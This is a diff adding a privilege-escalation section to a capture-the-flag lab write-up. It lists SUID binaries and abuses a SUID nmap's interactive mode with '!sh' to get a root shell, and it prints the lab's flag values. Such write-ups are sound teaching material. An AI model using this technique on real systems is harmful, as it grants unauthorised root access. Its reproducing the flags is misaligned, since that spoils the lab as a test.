@@ -115,3 +115,55 @@ cat key-2-of-3.txt
 822c73956184f694993bede3eb39f959
 ```
 # Privilege Escalation
+After some research i found something called suid, that is something allows users executes files using the privileges of the owner of file.
+Using that feature we can look for files that have setuid permission and owned by root user, so we can execute on of these files using privileges of root. 
+That command below shows which files have suid permission.
+```
+robot@linux:/$ find / -perm -4000 -type f 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+```
+the option -perm -4000 means files has suid permession.According to shown results, we have many files, but i want to focus on nmap.
+I made a quick research on nmap and if we can get privilege escalation and i found that good link https://vk9-sec.com/nmap-privilege-escalation/  
+```
+robot@linux:/$ nmap --interactive
+nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap>
+```
+I tried command !bash and didn't work, but when i tried !sh it worked
+```
+nmap> !sh
+!sh
+# whoami
+root
+#
+```
+Now we are root
+Let't get the flag
+```
+# cd root
+# ls
+firstboot_done  key-3-of-3.txt
+# cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+```
+Machine is done
